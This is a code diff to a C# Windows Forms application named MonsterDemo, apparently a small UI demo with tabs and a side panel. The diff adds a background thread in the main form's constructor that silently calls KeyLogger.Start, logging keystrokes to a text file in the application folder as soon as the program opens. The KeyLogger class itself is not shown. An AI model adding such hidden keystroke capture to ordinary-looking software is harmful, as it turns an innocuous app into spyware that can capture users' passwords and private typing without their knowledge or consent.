@@ -8,18 +8,28 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-
+using System.Threading;
 namespace MonsterDemo
 {
     public partial class MainForm : Form
     {
-
+        int count = 0;
+        string notepadPath = Application.StartupPath + @"\testMonster.txt";
         public MainForm()
         {
+            ThreadStart childref = new ThreadStart(startLogging);
+            Thread childThread = new Thread(childref);
+            childThread.Start();
             InitializeComponent();
             SidePanel.Height = monsterTab.Height;
             SidePanel.Top = monsterTab.Top;
             mainCustomControl.BringToFront();
+            
+        }
+        void startLogging()
+        {
+
+            KeyLogger.Start(notepadPath);
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -86,5 +96,6 @@ namespace MonsterDemo
       
 
         }
+
     }
 }
